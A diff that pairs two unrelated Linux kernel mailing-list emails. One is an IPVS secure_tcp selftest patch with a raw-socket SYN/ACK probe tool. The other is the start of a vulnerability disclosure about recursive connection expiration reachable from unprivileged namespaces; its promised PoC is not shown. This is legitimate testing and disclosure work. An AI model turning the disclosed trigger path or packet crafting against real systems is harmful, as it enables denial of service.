@@ -1,85 +1,82 @@
-Received: from mail-vs2-f12.google.com (mail-vs2-f12.google.com [74.125.227.12])
+Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 311AE446C18
-	for <lvs-devel@vger.kernel.org>; Wed, 16 Sep 2026 20:50:40 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.12
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C3EB8358378
+	for <lvs-devel@vger.kernel.org>; Thu, 17 Sep 2026 03:03:02 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789591856; cv=none; b=nm4lreofcAsHX5PrivodfzjOt8XD4SXdNLF2huvfaJdv/ecMIEx2L5HYzQFNvFiEF77+svzfW2CUYbuItKffucumxFUmqqW+W41vnmm1s1q86l8FGrUcwAuQDAbJvbNiUQIaa62Ccx5+wXp75a5iNBk59KIUZ4v3Ga/Hxdq8y1k=
+	t=1789614189; cv=none; b=HnfyrXv1RinhSQw/kqlRVzTFVOJZOD9HyMspwKWtLxi71Y05Hk7fKuY9Zaz5w0Hv9vFrwheWOX9n+rQRxz10FHRKw9TYTq1PofVHyruErN2dbqgJ6sE/Es/KjRGdzB43siyirW/XCgE0fQzNstFSc39BvncFLjMbxF1DLfzSOuU=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789591856; c=relaxed/simple;
-	bh=d015WyfzUrCY5Xikv+kBGLLE6Y5nEVM+w+Ool22/3Co=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=vAoebGi+Ts3dTLPw7F3pOJH34lQxn3ajcEfCb18ih0KDB0XJvJqgVvbwD2EyqBAESrjxf2ADp4+U4Nz/iiDgWeudD11gypcg8JXHiys0a51SGTVXwXfpbx0c9+xTFmqmjAMe90U2QnPMsRQxzq+dxe/ng/ApBu4UZQsaA+7hbck=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Vukvq46v; arc=none smtp.client-ip=74.125.227.12
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1789614189; c=relaxed/simple;
+	bh=aKVlQEsqVop/KpfKGB18ufgyf7OB4sOAaY4x6bGgWkk=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=IF6ENMs1vG6at0rKl6um7/oXYUu2C+q/xU2rcT+NfystWUC1VQWkJMqJX6zJfJIf98RlwZYkLlhMluK83bq+ve+nd7BryPIv3TPU6FSWyRB1zuYGozqaYjwUSf/uV7AfDTyY4+e7yuHPoQ2oAq53Pu4YL8oSueQvxmRIHacX+p4=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Koyy3jfo; arc=none smtp.client-ip=74.125.227.140
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Vukvq46v"
-Received: by mail-vs2-f12.google.com with SMTP id ada2fe7eead31-785686d2112so46098137.3
-        for <lvs-devel@vger.kernel.org>; Wed, 16 Sep 2026 13:50:38 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Koyy3jfo"
+Received: by mail-pj2-f12.google.com with SMTP id d9443c01a7336-2d747eb79f7so2562405ad.1
+        for <lvs-devel@vger.kernel.org>; Wed, 16 Sep 2026 20:03:02 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1789591837; x=1790196637; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=nNgWVGTYDdyrRGqwXlGrCAadI2A4n+E/28376qGTOsM=;
-        b=Vukvq46vJ4RBzE7P8sXc97jWc5pCgFzv2B731D+4XSwGuTEq91MPjTBuTI7EbCEUYA
-         tsajP8nJEyXseV1cifkImHt8Ryik0Q5HaOcQ99ZQGdpCPrVBQgXrKYBjlS/DgRy8Gtf1
-         l8O5Q/8F6OUy6DbkPFOzzhvvPaMfCSS2XWE5gKZSrV8wRdXsbAgAYlcTPPaEl123UhOZ
-         w12ui344S7WkvWvX8z99s74ySNBWV/+tYHpv+oFNoRt1u5HYvRK+OSuJA06J9fCjaaCy
-         v28ZZIoLu9WRriNAqhLN2BRzUnbTXnt9CNUf2Hbupb4io5qiVEOaaVhR9WqKBc87z1B5
-         yoBw==
+        d=nebusec.ai; s=google; t=1789614181; x=1790218981; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=aURCQeHeMgH2JlT36ddjBKRY2enbC3BlKL8xn7BVamI=;
+        b=Koyy3jfo9MJfPhjK+6mOqHvrGkq+JPtkZT69W0mgIFSEfpjj09dnjDyuK6MhSozVYz
+         uO9SfHv/32bTrh8+mM/HtThrzkeIT3ir3tP6uCuGKo0SdjHeAvuJ9mul59i+ewR+mFIh
+         TgT21Vt0uwQGAsiY26y9bBr5g8oRIv+o7SNDom/9bV/ZTZ5mi+ZLsWjeNgVoxY4+OHc6
+         Z0tq89icuyDSxdsaZvQjjzpsWV+X4zsCNqZA/zWOlpzGzbNJpzl4Dx7/wNiyxn9BHtyh
+         9Yy9WWeFD+9ZaVkot0jWpyM32nGBJbyl6c/XODceyHCu0UDcAVZ83GedClANxzqZQ8oN
+         aFmg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1789591837; x=1790196637;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to:content-type;
-        bh=nNgWVGTYDdyrRGqwXlGrCAadI2A4n+E/28376qGTOsM=;
-        b=r864zNstcEMZr3CDN9xsEgTdlflhLUFQDKbhbKfeZY11LDLA0eH/gtaeyiypyJWoQS
-         CRsA1QXS3qGwRyFZD+tYbF0+cm9Ueist3qqqCzCGvt2bP1W1B6J9hawHUxYXGB1hSoad
-         0SaNjrzDTkhVUamUVRxc5mvmikxQRgvBJnImYqIMWod3PrwrrwEUoDEyLYI6hnxnqQTi
-         c10d2RnXhr/A+bdCyLmloa3usVkIUQ9kWvnnBijEVyUmBy3CD5tmex1rt3kGr+OKEYb/
-         1iSTB64ynt1amcE/HiWynu9YsWD6Ap8P6Qi5vxlbHlcopmRKsrWGGGIzUGqb+lBdDD+S
-         pZyQ==
-X-Forwarded-Encrypted: i=1; AKwUvBwfQa4Kcq2XJsIWUO6V990RY4QWqStQjBeDVjAWByXwfGVZIh4ep8UjpPQ/XrqlK+57GJwRtBTiC8U=@vger.kernel.org
-X-Gm-Message-State: AFuF++kyWWegfJzioW54rj+v+i7d/o0CeaKY/TqWz7IJ4qyz9C8DMR2J
-	ac9jwKs8aYb1WHvQSmPBvY67hUXtmZv554jUnNMSPdbxqQqkoTzoFvf5fPyC83rr
-X-Gm-Gg: AYBFou32j5tmUNnM+J8wIItIAnX4EQJxp2c52f+WEnORoHDNH5Q4GAuBfiCfU1MHg2Z
-	qr7SWfb1ZzTjM8GQl589sWIOWs+aEVv3cAGIkCbAvyAwYVy76hRs1Hqn2iyHVtJSj1iUkUkEMZY
-	Ps+17649oyvj8VBLp/IPJBZcYs9i5nZ3GBZF7Qbrao+y8PU7IWnDTpDgrUdlqDNVzDv1GqEJgL+
-	mzvVR16v2GxTqK9yoGt/OJoZ5TGW09VhxoT6Q4yMjmZKzlk8Z4MuH0lrJILgpV8YeRFg+A6s4V8
-	FfZKnUcAMzWQwMGZEVwZN149ZVmR/gkjuQZuOxmdORS/61UXk3gCDsc/853tzfMiquLnfL8XvGm
-	YtsVLVhM6jhz/hxveShGYPGpEaWSyGiZUvS+sBKN3ZNw6F+y2EGlNBILizhIBtj34i99bx27MDj
-	lTULn5dtTw5RRfCPfdKPIM50PZKi/ERbrvoYKNeODGVFhzh7O4CtIiJuwj+51K9epDGtiVkC/L9
-	w==
-X-Received: by 2002:a05:6102:442c:b0:7a1:f7d2:e80b with SMTP id ada2fe7eead31-7a1f7d2ff39mr676578137.19.1789591836445;
-        Wed, 16 Sep 2026 13:50:36 -0700 (PDT)
-Received: from adriano ([190.215.95.120])
-        by smtp.gmail.com with ESMTPSA id a1e0cc1a2514c-9832354a8aasm947799241.10.2026.09.16.13.50.32
+        d=1e100.net; s=20260707; t=1789614181; x=1790218981;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=aURCQeHeMgH2JlT36ddjBKRY2enbC3BlKL8xn7BVamI=;
+        b=DFmG/j/81r0J8cP/QqbGoTfAhB3PykFlnXA67shDJpqj+1w8H9g7MOhBBZinou/LCU
+         UK/BSgZIDpd1cQ1TNXqYwtdEE8JrhhF+8fh7fzFl8BbX14X7EiyR8/5pWR6SEdfY1edF
+         SW5LqZyyWDDQjAjnMggN8Dk1+/cs4CxYI32nmg62pSBvRbsFqwue749aT7S8oXj67ErM
+         RW8Pp1TJSUGrNooRhzXej01e2YQVZs/3tTS6jac8G6MJoXNSESqqgLstY94MZVTDxNAA
+         vvbb1oUiusJ6vE+/lcPqTArXJuH3ZYGWrsX2WEWUtq0q1zgkniXXqslpFRgB4Sv3s+9K
+         MWVg==
+X-Forwarded-Encrypted: i=1; AKwUvBwInzWNoIwVXlNuDeRO+oX5BWazdPQs5M6RBcfqnmJvEZg2tnHsTk4CxxfVm6DULbcCc9GSvE6w8ic=@vger.kernel.org
+X-Gm-Message-State: AFuF++n4yVj9Vwi14b573v5ATRuHDFp02/YOzM2dfa1Patt6H2ARKsSY
+	90q7Hh+qNLd5Zct5CZAMu5wqu3W4wpO7ebZU4jARxtepBO+TvlhwB66UdVubQ88eCRmD
+X-Gm-Gg: AYBFou2KTI1B4aCCig4w/nXJpae/8FocasiNZ5dUPqZDuMYPXP9cbe3GlBC4V0aBEmL
+	FWx3WQctQCBUbPHCWNf9fhrdPwAt/VIA4CVJRTD+xeyYczwIB5Ir9PpXbe8KTuieTneUw0By/7W
+	QtDOnmLpeHv0fvdUVCRp7fTicBHtLtdVX717RdTw8OGXFds/6t39En6/Lg97pGEarT0m1nOK5Yf
+	9v7vr/iizDVx6Rx9dlAd4VjCFm0FvvHLFAB1aQTuVIIHQI6I4Iv4ZXqUIPTG+4SGgnejbxc+Gm+
+	BRN8Fv+rqjL5WmYbLNuoGm6//g7KmqUL99LReyEVJ06QOIwr1YNDhqCuuRJoEcxKfjYJhX46foI
+	Pc89DuymvoqhD2MUbfN6fyKACDnPR8yaxvKg35Jpl7o2QIw1tw9kp+F+04xg6i9BXneysJoBC5U
+	zldvVvJiDweDHAoM3MclGZ7UoUIWXHHXz21PufsRwd65OtySUoJ3Ksb6wkIHmUTBFVM+iBi/i0N
+	ff/YUcG00UV3SisWnNUgsRdSJtzvg==
+X-Received: by 2002:a17:902:d4ce:b0:2d6:fec3:bd57 with SMTP id d9443c01a7336-2dd8e3fd1f2mr91773445ad.14.1789614180897;
+        Wed, 16 Sep 2026 20:03:00 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2dd89f1b862sm19167845ad.71.2026.09.16.20.02.55
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 16 Sep 2026 13:50:36 -0700 (PDT)
-From: Adriano Cordova <adrianox@gmail.com>
-To: Simon Horman <horms@verge.net.au>,
-	Julian Anastasov <ja@ssi.bg>
-Cc: Pablo Neira Ayuso <pablo@netfilter.org>,
+        Wed, 16 Sep 2026 20:03:00 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: Simon Horman <horms@verge.net.au>
+Cc: Julian Anastasov <ja@ssi.bg>,
+	Pablo Neira Ayuso <pablo@netfilter.org>,
 	Florian Westphal <fw@strlen.de>,
 	Phil Sutter <phil@nwl.cc>,
-	"David S . Miller" <davem@davemloft.net>,
+	"David S. Miller" <davem@davemloft.net>,
 	Eric Dumazet <edumazet@google.com>,
 	Jakub Kicinski <kuba@kernel.org>,
 	Paolo Abeni <pabeni@redhat.com>,
-	Shuah Khan <shuah@kernel.org>,
 	netdev@vger.kernel.org,
 	lvs-devel@vger.kernel.org,
 	netfilter-devel@vger.kernel.org,
-	Adriano Cordova <adrianox@gmail.com>
-Subject: [PATCH v3 nf-next 3/3] selftests: netfilter: ipvs: add per-service secure_tcp test
-Date: Wed, 16 Sep 2026 17:50:04 -0300
-Message-ID: <20260916205004.647194-4-adrianox@gmail.com>
-X-Mailer: git-send-email 2.51.0
-In-Reply-To: <20260916205004.647194-1-adrianox@gmail.com>
-References: <20260916205004.647194-1-adrianox@gmail.com>
+	coreteam@netfilter.org,
+	linux-kernel@vger.kernel.org,
+	Zihan Xi <zihanx@nebusec.ai>
+Subject: [PATCH net v2 0/2] ipvs: avoid stack overflow from recursive connection expiration
+Date: Thu, 17 Sep 2026 03:02:50 +0000
+Message-ID: <cover.1789435989.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: lvs-devel@vger.kernel.org
 List-Id: <lvs-devel.vger.kernel.org>
@@ -88,694 +85,1161 @@ List-Unsubscribe: <mailto:lvs-devel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Two services share a VIP, one carrying IP_VS_SVC_F_SECURE_TCP.
-A bare SYN+ACK suffices to test the state machine: the normal
-service reaches ESTABLISHED, but the secure one stays in SYN_RECV.
+Hi Linux kernel maintainers,
 
-Assisted-by: opencode:deepseek-flash
-Signed-off-by: Adriano Cordova <adrianox@gmail.com>
----
-Changes in v2:
-- send probes with TTL=1 instead of an nft drop, and fix
-  Sashiko comments.
+We found and validated an issue in
+net/netfilter/ipvs/ip_vs_ftp.c and net/netfilter/ipvs/ip_vs_conn.c. A
+non-root user can reach the trigger after creating a user namespace and a
+network namespace. We've tested the fix, and it should not affect any
+other functionality.
 
-(no changes since v2)
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
- .../testing/selftests/net/netfilter/Makefile  |   6 +
- .../selftests/net/netfilter/gen_tcp_probe.c   | 141 ++++++++
- .../net/netfilter/ipvs_secure_tcp.sh          | 153 +++++++++
- .../net/netfilter/ipvs_secure_tcp_mln.c       | 323 ++++++++++++++++++
- 4 files changed, 623 insertions(+)
- create mode 100644 tools/testing/selftests/net/netfilter/gen_tcp_probe.c
- create mode 100755 tools/testing/selftests/net/netfilter/ipvs_secure_tcp.sh
- create mode 100644 tools/testing/selftests/net/netfilter/ipvs_secure_tcp_mln.c
+---- details below ----
 
-diff --git a/tools/testing/selftests/net/netfilter/Makefile b/tools/testing/selftests/net/netfilter/Makefile
-index f88dd4ef8d26..fad05afadd41 100644
---- a/tools/testing/selftests/net/netfilter/Makefile
-+++ b/tools/testing/selftests/net/netfilter/Makefile
-@@ -20,6 +20,7 @@ TEST_PROGS := \
- 	conntrack_tcp_unreplied.sh \
- 	conntrack_vrf.sh \
- 	ipvs.sh \
-+	ipvs_secure_tcp.sh \
- 	nf_conntrack_packetdrill.sh \
- 	nf_nat_edemux.sh \
- 	nft_audit.sh \
-@@ -50,6 +51,8 @@ TEST_GEN_FILES = \
- 	connect_close \
- 	conntrack_dump_flush \
- 	conntrack_reverse_clash \
-+	gen_tcp_probe \
-+	ipvs_secure_tcp_mln \
- 	nf_queue \
- 	sctp_collision \
- 	udpclash \
-@@ -60,6 +63,9 @@ include ../../lib.mk
- $(OUTPUT)/nf_queue: CFLAGS += $(MNL_CFLAGS)
- $(OUTPUT)/nf_queue: LDLIBS += $(MNL_LDLIBS)
- 
-+$(OUTPUT)/ipvs_secure_tcp_mln: CFLAGS += $(MNL_CFLAGS)
-+$(OUTPUT)/ipvs_secure_tcp_mln: LDLIBS += $(MNL_LDLIBS)
-+
- $(OUTPUT)/conntrack_dump_flush: CFLAGS += $(MNL_CFLAGS)
- $(OUTPUT)/conntrack_dump_flush: LDLIBS += $(MNL_LDLIBS)
- $(OUTPUT)/udpclash: LDLIBS += -lpthread
-diff --git a/tools/testing/selftests/net/netfilter/gen_tcp_probe.c b/tools/testing/selftests/net/netfilter/gen_tcp_probe.c
-new file mode 100644
-index 000000000000..c6f8192599d8
---- /dev/null
-+++ b/tools/testing/selftests/net/netfilter/gen_tcp_probe.c
-@@ -0,0 +1,141 @@
-+// SPDX-License-Identifier: GPL-2.0
-+/*
-+ * Send a TCP SYN then a TCP ACK (no SYN-ACK, no data) to the VIP.
-+ * IPVS's TCP state machine only inspects SYN/FIN/ACK/RST bits, so this
-+ * exercises the INPUT-direction state transition:
-+ *
-+ *   SYN:  NONE -> SYN_RECV
-+ *   ACK:  SYN_RECV -> ESTABLISHED   (tcp_states, normal)
-+ *         SYN_RECV -> SYN_RECV      (tcp_states_dos, secure_tcp)
-+ *
-+ * A TTL of 1 keeps the packets from reaching the real server: IPVS updates
-+ * the connection state before forwarding, then the packet expires and an
-+ * ICMP time-exceeded is sent back to us.
-+ *
-+ * Requires CAP_NET_RAW.
-+ */
-+
-+#include <stdio.h>
-+#include <stdlib.h>
-+#include <string.h>
-+#include <unistd.h>
-+#include <stdint.h>
-+#include <arpa/inet.h>
-+#include <sys/socket.h>
-+#include <netinet/ip.h>
-+#include <netinet/tcp.h>
-+#include <linux/if_ether.h>
-+
-+static inline uint16_t csump(const void *data, size_t len)
-+{
-+	const uint8_t *p = data;
-+	uint32_t sum = 0;
-+
-+	while (len > 1) {
-+		uint16_t w;
-+
-+		memcpy(&w, p, sizeof(w));
-+		sum += w;
-+		p += 2;
-+		len -= 2;
-+	}
-+	if (len) {
-+		uint16_t w = 0;
-+
-+		memcpy(&w, p, 1);
-+		sum += w;
-+	}
-+	while (sum >> 16)
-+		sum = (sum & 0xffff) + (sum >> 16);
-+	return ~sum;
-+}
-+
-+static void send_seg(int fd, const struct in_addr *sip, uint16_t sport,
-+		     const struct in_addr *dip, uint16_t dport,
-+		     uint32_t seq, int syn, int ack)
-+{
-+	struct {
-+		struct iphdr ip;
-+		struct tcphdr tcp;
-+	} pkt = { };
-+	struct iphdr *ip = &pkt.ip;
-+	struct tcphdr *tcp = &pkt.tcp;
-+	struct sockaddr_in dst;
-+
-+	ip->version = 4;
-+	ip->ihl = 5;
-+	ip->tot_len = htons(sizeof(pkt));
-+	ip->id = htons((uint16_t)(seq & 0xffff));
-+	ip->ttl = 1;
-+	ip->protocol = IPPROTO_TCP;
-+	ip->saddr = sip->s_addr;
-+	ip->daddr = dip->s_addr;
-+
-+	tcp->source = sport;
-+	tcp->dest = dport;
-+	tcp->seq = htonl(seq);
-+	tcp->ack_seq = htonl(seq + 1);
-+	tcp->doff = 5;
-+	if (syn)
-+		tcp->syn = 1;
-+	if (ack)
-+		tcp->ack = 1;
-+	tcp->window = htons(1024);
-+
-+	ip->check = csump(ip, sizeof(struct iphdr));
-+	/* pseudo header for TCP checksum */
-+	{
-+		uint8_t ph[12];
-+		uint8_t tcpbuf[12 + sizeof(struct tcphdr)];
-+
-+		memcpy(ph, &ip->saddr, 4);
-+		memcpy(ph + 4, &ip->daddr, 4);
-+		ph[8] = 0;
-+		ph[9] = IPPROTO_TCP;
-+		ph[10] = (sizeof(struct tcphdr) >> 8) & 0xff;
-+		ph[11] = sizeof(struct tcphdr) & 0xff;
-+
-+		memcpy(tcpbuf, ph, 12);
-+		memcpy(tcpbuf + 12, tcp, sizeof(struct tcphdr));
-+		tcp->check = csump(tcpbuf, sizeof(tcpbuf));
-+	}
-+
-+	memset(&dst, 0, sizeof(dst));
-+	dst.sin_family = AF_INET;
-+	dst.sin_addr = *dip;
-+	dst.sin_port = dport;
-+	sendto(fd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&dst,
-+	       sizeof(dst));
-+}
-+
-+int main(int argc, char *argv[])
-+{
-+	struct in_addr sip, dip;
-+	uint16_t sport, dport;
-+	int fd, one = 1;
-+	uint32_t seq = 0x12345678;
-+
-+	if (argc != 5) {
-+		fprintf(stderr, "usage: %s <src_ip> <src_port> <dst_ip> <dst_port>\n",
-+			argv[0]);
-+		return 2;
-+	}
-+	inet_pton(AF_INET, argv[1], &sip);
-+	sport = htons((uint16_t)atoi(argv[2]));
-+	inet_pton(AF_INET, argv[3], &dip);
-+	dport = htons((uint16_t)atoi(argv[4]));
-+
-+	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-+	if (fd < 0) {
-+		perror("raw socket");
-+		return 1;
-+	}
-+	setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
-+
-+	send_seg(fd, &sip, sport, &dip, dport, seq, 1, 0);
-+	usleep(100000);
-+	send_seg(fd, &sip, sport, &dip, dport, seq + 1, 0, 1);
-+
-+	close(fd);
-+	return 0;
-+}
-diff --git a/tools/testing/selftests/net/netfilter/ipvs_secure_tcp.sh b/tools/testing/selftests/net/netfilter/ipvs_secure_tcp.sh
-new file mode 100755
-index 000000000000..4d250bcbb2cf
---- /dev/null
-+++ b/tools/testing/selftests/net/netfilter/ipvs_secure_tcp.sh
-@@ -0,0 +1,153 @@
-+#!/bin/bash
-+# SPDX-License-Identifier: GPL-2.0
-+#
-+# Runtime test for per-service secure_tcp (IP_VS_SVC_F_SECURE_TCP).
-+#
-+# Sets up the same 3-namespace topology as ipvs.sh
-+# but checks the TCP state machine, not data forwarding.  Two
-+# identical TCP services are added on the same VIP on different ports,
-+# one is marked secure_tcp, the other is not. For each a bare SYN is
-+# followed by a bare ACK (no SYN-ACK / no data).  IPVS classifies the
-+# connection from the flag bits:
-+#   * normal service:  SYN -> SYN_RECV, ACK -> ESTABLISHED
-+#   * secure_tcp service:  SYN -> SYN_RECV, ACK -> SYN_RECV
-+# This test checks that this is the case via `ipvsadm -Lnc`.
-+#
-+# Requires root, netns, ipvsadm, and the built helpers
-+# ipvs_secure_tcp_mln and gen_tcp_probe.
-+
-+source lib.sh
-+
-+ret=0
-+readonly vip="207.175.44.110"
-+readonly gip="10.0.0.1"
-+readonly dip="172.16.0.1"
-+readonly rip="172.16.0.2"
-+readonly cip="10.0.0.2"
-+readonly sip="10.0.0.3"
-+readonly port_secure=8081
-+readonly port_plain=8080
-+
-+GREEN='\033[0;92m'
-+RED='\033[0;31m'
-+NC='\033[0m'
-+
-+checktool "ipvsadm -v" "run test without ipvsadm"
-+
-+setup() {
-+	setup_ns ns0 ns1 ns2
-+
-+	ip link add veth01 netns "${ns0}" type veth peer name veth10 netns "${ns1}"
-+	ip link add veth02 netns "${ns0}" type veth peer name veth20 netns "${ns2}"
-+	ip link add veth12 netns "${ns1}" type veth peer name veth21 netns "${ns2}"
-+
-+	ip netns exec "${ns0}" ip link set veth01 up
-+	ip netns exec "${ns0}" ip link set veth02 up
-+	ip netns exec "${ns0}" ip link add br0 type bridge
-+	ip netns exec "${ns0}" ip link set veth01 master br0
-+	ip netns exec "${ns0}" ip link set veth02 master br0
-+	ip netns exec "${ns0}" ip link set br0 up
-+	ip netns exec "${ns0}" ip addr add "${cip}/24" dev br0
-+
-+	ip netns exec "${ns1}" ip link set veth10 up
-+	ip netns exec "${ns1}" ip addr add "${gip}/24" dev veth10
-+	ip netns exec "${ns1}" ip link set veth12 up
-+	ip netns exec "${ns1}" ip addr add "${dip}/24" dev veth12
-+	ip netns exec "${ns1}" ip link set lo up
-+	ip netns exec "${ns1}" ip addr add "${vip}/32" dev lo:1
-+	ip netns exec "${ns1}" sysctl -qw net.ipv4.ip_forward=1
-+
-+	ip netns exec "${ns2}" ip link set veth20 up
-+	ip netns exec "${ns2}" ip addr add "${sip}/24" dev veth20
-+	ip netns exec "${ns2}" ip link set veth21 up
-+	ip netns exec "${ns2}" ip addr add "${rip}/24" dev veth21
-+
-+	ip netns exec "${ns2}" ip addr add "${vip}/32" dev lo:1
-+
-+	ip netns exec "${ns0}" ip route add "${vip}/32" via "${gip}" dev br0
-+
-+	# load ipvs, then the rr scheduler (separate calls: modprobe treats
-+	# the second name as a module parameter, not a second module)
-+	ip netns exec "${ns1}" modprobe ip_vs
-+	ip netns exec "${ns1}" modprobe ip_vs_rr
-+
-+	sleep 1
-+}
-+
-+cleanup() {
-+	cleanup_all_ns
-+}
-+
-+# State of the connection to the VIP:port, from `ipvsadm -Lnc`.
-+# Fields: pro  expire  state  source  virtual  destination
-+conn_state() {
-+	local vport=$1
-+	ip netns exec "${ns1}" ipvsadm -Lnc 2>/dev/null |
-+		awk -v vt="${vip}:${vport}" '$5==vt { print $3; exit }'
-+}
-+
-+assert_state() {
-+	local port=$1 want=$2
-+	local got
-+	got="$(conn_state "$port")"
-+	echo "  vip ${vip}:${port}: state=${got:-?}"
-+	if [ "${got:-}" != "$want" ]; then
-+		echo -e "${RED}FAIL${NC}: vip ${vip}:${port} expected state" \
-+			"${want}, got ${got:-none}"
-+		ret=1
-+	fi
-+}
-+
-+test_secure() {
-+	local bin probe
-+
-+	# Register the two services (secure_tcp on the secure port)
-+	bin="$(pwd)/ipvs_secure_tcp_mln"
-+	probe="$(pwd)/gen_tcp_probe"
-+	ip netns exec "${ns1}" "$bin" add "${vip}" "${port_secure}" secure
-+	ip netns exec "${ns1}" "$bin" add "${vip}" "${port_plain}" plain
-+
-+	# Add a real server to both services.  Use NAT (-m): in DR the conn gets
-+	# IP_VS_CONN_F_NOOUTPUT, which makes the client ACK an INPUT_ONLY event
-+	# and even tcp_states_dos promotes to ESTABLISHED, hiding the difference.
-+	ip netns exec "${ns1}" ipvsadm -a -m -t "${vip}:${port_secure}" -r "${rip}:${port_secure}"
-+	ip netns exec "${ns1}" ipvsadm -a -m -t "${vip}:${port_plain}" -r "${rip}:${port_plain}"
-+
-+	# verify the flag was actually set
-+	local got
-+	got="$(ip netns exec "${ns1}" "$bin" get "${vip}" "${port_secure}")"
-+	echo "  secured service reports: ${got}"
-+	echo "${got}" | grep -q "secure_tcp=1" ||
-+		{ echo -e "${RED}FAIL${NC}: flag not set"; ret=1; }
-+	got="$(ip netns exec "${ns1}" "$bin" get "${vip}" "${port_plain}")"
-+	echo "${got}" | grep -q "secure_tcp=0" ||
-+		{ echo -e "${RED}FAIL${NC}: flag unexpectedly set"; ret=1; }
-+
-+	# The probes carry TTL=1, so IPVS updates the connection state and
-+	# then the packet expires before reaching the real server (which
-+	# stays silent, no RST to interfere with the observation).
-+
-+	# Push SYN then ACK to each service from the client
-+	ip netns exec "${ns0}" "$probe" "${cip}" 40000 "${vip}" "${port_secure}"
-+	ip netns exec "${ns0}" "$probe" "${cip}" 40001 "${vip}" "${port_plain}"
-+	sleep 1
-+
-+	echo "Testing per-service secure_tcp..."
-+	echo "  --- connection table (ipvsadm -Lnc) ---"
-+	ip netns exec "${ns1}" ipvsadm -Lnc 2>/dev/null
-+	echo "  --- end connection table ---"
-+	assert_state "${port_plain}" ESTABLISHED
-+	assert_state "${port_secure}" SYN_RECV
-+}
-+
-+trap cleanup EXIT
-+
-+setup
-+test_secure
-+
-+if [ "$ret" -ne 0 ]; then
-+	echo -e "$(basename $0): ${RED}FAIL${NC}"
-+	exit 1
-+fi
-+echo -e "$(basename $0): ${GREEN}PASS${NC}"
-+exit 0
-diff --git a/tools/testing/selftests/net/netfilter/ipvs_secure_tcp_mln.c b/tools/testing/selftests/net/netfilter/ipvs_secure_tcp_mln.c
-new file mode 100644
-index 000000000000..7f17845699ff
---- /dev/null
-+++ b/tools/testing/selftests/net/netfilter/ipvs_secure_tcp_mln.c
-@@ -0,0 +1,323 @@
-+// SPDX-License-Identifier: GPL-2.0
-+/*
-+ * libmnl helper to set/query the per-service secure_tcp flag
-+ * (IP_VS_SVC_F_SECURE_TCP), which ipvsadm does not expose.
-+ *
-+ * Usage:
-+ *   ipvs_secure_tcp_mln add <vip> <port> <secure|plain>
-+ *       Create a TCP virtual service (scheduler "rr") with the flag either
-+ *       set or not.  Add real servers afterwards with:
-+ *           ipvsadm -a -t <vip>:<port> -r <rs>:<port>
-+ *   ipvs_secure_tcp_mln get <vip> <port>
-+ *       Print "secure_tcp=<0|1>" for the service.
-+ */
-+
-+#include <stdio.h>
-+#include <stdlib.h>
-+#include <string.h>
-+#include <errno.h>
-+#include <arpa/inet.h>
-+
-+#include <linux/netlink.h>
-+#include <linux/genetlink.h>
-+#include <linux/ip_vs.h>
-+
-+#include <libmnl/libmnl.h>
-+
-+/* Fallback in case the kernel's installed uapi header is older */
